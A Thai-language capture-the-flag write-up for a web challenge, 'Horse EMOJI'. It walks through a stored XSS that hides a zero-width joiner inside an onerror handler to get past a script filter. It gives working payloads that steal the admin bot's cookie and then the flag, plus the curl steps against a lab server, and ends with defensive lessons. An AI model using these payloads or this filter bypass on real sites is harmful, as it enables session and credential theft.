@@ -1,0 +1,194 @@
+🐎 Horse EMOJI (WEBEasy) – Emoji Smuggling XSS
+
+Catalog: WEBEasy
+Point: 10
+Flag Format: ARCHA{...}
+
+📌 Challenge Overview
+
+เว็บไซต์เป็นระบบ Private Emoji Comment Board
+ผู้ใช้สามารถสร้าง session และโพสต์ comment ได้ โดยมีฟีเจอร์ Report to Admin
+เมื่อกด report จะมี Admin Bot เข้าเยี่ยมชมหน้าเว็บนั้น
+
+โจทย์ระบุว่า:
+
+Server มีระบบกรอง <script>
+
+มีระบบ monitor ป้องกัน hacker
+
+เป้าหมายคือ ขโมย flag จาก admin
+
+🔍 Source Code Analysis
+
+จาก client-side JavaScript ที่ให้มา พบโค้ดสำคัญ:
+
+function renderComment(rawText) {
+    const cleanHtml = rawText.replace(/\u200D/g, '');
+    div.innerHTML = `<strong>User:</strong> ${cleanHtml}`;
+}
+
+จุดอ่อนสำคัญ
+
+ใช้ innerHTML → XSS ได้
+
+Server กรอง <script> เท่านั้น
+
+Client ลบเฉพาะ Zero Width Joiner (U+200D) ก่อน render
+
+📌 นี่คือที่มาของชื่อโจทย์
+
+Emoji Smuggling = ซ่อน payload ด้วย Unicode (ZWJ)
+
+🧠 Attack Idea
+
+ใช้เทคนิค:
+
+แทรก \u200D (ZWJ) ใน event handler เช่น o‍nerror
+
+Server ไม่ detect
+
+Client ลบ ZWJ → กลายเป็น JavaScript ที่ทำงานจริง
+
+จากนั้น:
+
+โพสต์ XSS payload
+
+Report ให้ Admin Bot เข้า
+
+ให้ Bot ส่งข้อมูลลับกลับมาใน comment ของเรา
+
+⚙️ Exploitation (Kali Linux)
+1️⃣ สร้าง Session
+SESSION=$(cat /dev/urandom | tr -dc a-z0-9 | head -c 20)
+
+2️⃣ XSS Payload รอบแรก – ขโมย admin secret
+
+สร้าง payload ด้วย Python เพื่อให้ ZWJ ไม่หาย
+
+python3 - <<'PY' > payload1.html
+zwj = "\u200d"
+payload = f"""<img src=x o{zwj}nerror="
+fetch('/api/comments',{{
+ method:'POST',
+ headers:{{'Content-Type':'application/json'}},
+ body:JSON.stringify({{
+  session:new URLSearchParams(location.search).get('session'),
+  text:'FLAG='+document.cookie
+ }})
+})
+">
+"""
+print(payload)
+PY
+
+3️⃣ ส่ง payload เข้าเว็บ
+PAYLOAD=$(cat payload1.html | jq -Rs .)
+
+curl -X POST http://172.18.0.60/api/comments \
+ -H "Content-Type: application/json" \
+ -d "{\"session\":\"$SESSION\",\"text\":$PAYLOAD}"
+
+4️⃣ Report ให้ Admin Bot
+curl -X POST http://172.18.0.60/api/report \
+ -H "Content-Type: application/json" \
+ -d "{\"url\":\"http://172.18.0.60/?session=$SESSION\"}"
+
+5️⃣ ตรวจผลลัพธ์
+curl http://172.18.0.60/api/comments?session=$SESSION | jq
+
+
+ได้ข้อมูล:
+
+FLAG=admin_secret=42eef4e3-4733-49c5-866f-626e94a8c4c3
+
+
+📌 ยังไม่ใช่ flag จริง แต่เป็น admin_secret
+
+🔑 Privilege Escalation
+
+เมื่อลองใช้ secret ตรง ๆ:
+
+curl http://172.18.0.60/api/flag \
+ -H "X-Admin-Secret: 42eef4e3-4733-49c5-866f-626e94a8c4c3"
+
+
+ได้:
+
+{"error":"Access denied. You need admin privileges."}
+
+
+แปลว่า:
+
+Secret ถูกต้อง
+
+แต่ต้องอยู่ใน admin session context
+
+💀 Final Exploit – XSS รอบสอง (ให้ Admin ดึง flag เอง)
+Payload รอบสอง
+python3 - <<'PY' > payload2.html
+zwj = "\u200d"
+payload = f"""<img src=x o{zwj}nerror="
+fetch('/api/flag',{{
+ credentials:'include',
+ headers:{{'X-Admin-Secret':'42eef4e3-4733-49c5-866f-626e94a8c4c3'}}
+}})
+.then(r=>r.text())
+.then(t=>fetch('/api/comments',{{
+ method:'POST',
+ headers:{{'Content-Type':'application/json'}},
+ body:JSON.stringify({{
+  session:new URLSearchParams(location.search).get('session'),
+  text:t
+ }})
+}))
+">
+"""
+print(payload)
+PY
+
+ส่ง payload + report ซ้ำ
+PAYLOAD=$(cat payload2.html | jq -Rs .)
+
+curl -X POST http://172.18.0.60/api/comments \
+ -H "Content-Type: application/json" \
+ -d "{\"session\":\"$SESSION\",\"text\":$PAYLOAD}"
+
+curl -X POST http://172.18.0.60/api/report \
+ -H "Content-Type: application/json" \
+ -d "{\"url\":\"http://172.18.0.60/?session=$SESSION\"}"
+
+ดึง flag
+curl http://172.18.0.60/api/comments?session=$SESSION \
+ | jq -r '.[].text' | grep ARCHA
+
+🏁 Flag
+ARCHA{...} ลืมเซฟไว้
+
+
+(ค่า flag ที่ระบบแสดง)
+
+🧠 Lessons Learned
+
+❌ การกรอง <script> อย่างเดียว ไม่พอ
+
+❌ innerHTML + user input = XSS
+
+⚠️ Unicode (ZWJ) ใช้ bypass filter ได้
+
+🤖 Admin bot + report = Stored XSS = RCE ฝั่ง admin
+
+🔑 Secret ต้องใช้ใน security context ที่ถูกต้อง
+
+✅ Final Summary
+
+โจทย์นี้เป็นตัวอย่างชัดเจนของ:
+
+Unicode filter bypass
+
+Stored XSS
+
+Privilege escalation ผ่าน admin bot
+
+Client-side sanitization ที่ไม่ปลอดภัย
+
+จบด่านด้วย XSS + Emoji Smuggling อย่างสมบูรณ์ 🐎🔥
